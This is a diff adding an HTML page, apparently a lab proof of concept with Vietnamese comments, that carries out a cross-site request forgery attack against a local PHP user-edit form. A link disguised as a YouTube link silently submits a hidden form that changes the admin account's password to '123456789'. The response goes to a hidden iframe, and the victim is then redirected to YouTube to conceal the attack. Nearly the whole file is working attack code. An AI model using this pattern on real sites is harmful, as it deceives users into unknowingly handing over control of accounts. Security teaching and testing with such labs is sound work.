@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <title>CSRF Edit User</title>
+  </head>
+  <body>
+    <!-- Link mồi bẫy -->
+    <!-- <a href="https://www.youtube.com/"
+     onclick="document.querySelector('#csrfForm button').click(); 
+              // setTimeout(() => window.location.href='https://www.youtube.com/', 500); 
+              return false;">
+    Youtube (Đổi mật khẩu admin)
+  </a> -->
+    <a
+      href="https://www.youtube.com/"
+      onclick="document.querySelector('#csrfForm button').click(); 
+      setTimeout(() => window.location.href='https://www.youtube.com/', 500); 
+      return false;"
+    >
+      Youtube (Đổi thông Admin)
+    </a>
+
+    <form
+      id="csrfForm"
+      method="POST"
+      action="http://localhost/csrf/form_user.php?id=1"
+      target="hiddenFrame"
+      style="display: none"
+    >
+      <input type="hidden" name="id" value="1" />
+      <input type="hidden" name="name" value="admin" />
+      <input type="hidden" name="password" value="123456789" />
+      <button
+        type="submit"
+        name="submit"
+        value="submit"
+        class="btn btn-primary"
+      ></button>
+    </form>
+
+    <!-- Iframe ẩn để không hiển thị kết quả -->
+    <iframe name="hiddenFrame" style="display: none"></iframe>
+
+    <!-- Form ẩn gửi POST để sửa user -->
+    <!-- <form id="csrfForm" method="POST" action="http://localhost/csrf/form_user.php?id=1" target="hiddenFrame" style="display:none;">
+      <input type="hidden" name="id" value="1">
+      <input type="hidden" name="name" value="admin">
+      <input type="hidden" name="password" value="123456">
+      <button type="submit" name="submit" value="submit"></button>
+  </form> -->
+  </body>
+</html>
